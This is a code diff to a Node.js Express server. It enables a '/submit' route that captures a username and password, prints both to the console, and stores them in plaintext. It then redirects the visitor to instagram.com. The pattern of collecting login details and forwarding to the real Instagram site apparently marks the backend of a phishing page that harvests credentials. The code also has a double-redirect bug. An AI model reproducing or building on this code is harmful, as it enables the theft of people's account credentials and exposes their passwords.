@@ -64,28 +64,28 @@ app.get("/report",function(req,res){
 });
 
 app.post('/submit', async (req, res) => {
-  // const uname=req.body.uname;
-  // const password=req.body.password;
+  const uname=req.body.uname;
+  const password=req.body.password;
 
-  // console.log(uname);
-  // console.log(password);
+  console.log(uname);
+  console.log(password);
 
 
-  // const newUser = new UserDetails({
-  //   username: uname,
-  //   password: password
-  // });
-  // // Save the user to the database
-  // newUser.save().then((savedUser) => {
-  //   console.log('User saved:', savedUser);
-  // }).catch((error) => {
-  //   // Handle validation errors and other errors
-  //   if (error.name === 'ValidationError') {
-  //     console.error('Validation error:', error.message);
-  //   } else {
-  //     console.error('Error saving user:', error);
-  //   }
-  // });
+  const newUser = new UserDetails({
+    username: uname,
+    password: password
+  });
+  // Save the user to the database
+  newUser.save().then((savedUser) => {
+    console.log('User saved:', savedUser);
+  }).catch((error) => {
+    // Handle validation errors and other errors
+    if (error.name === 'ValidationError') {
+      console.error('Validation error:', error.message);
+    } else {
+      console.error('Error saving user:', error);
+    }
+  });
   res.redirect("/report");
   res.redirect("https://www.instagram.com/");
 });
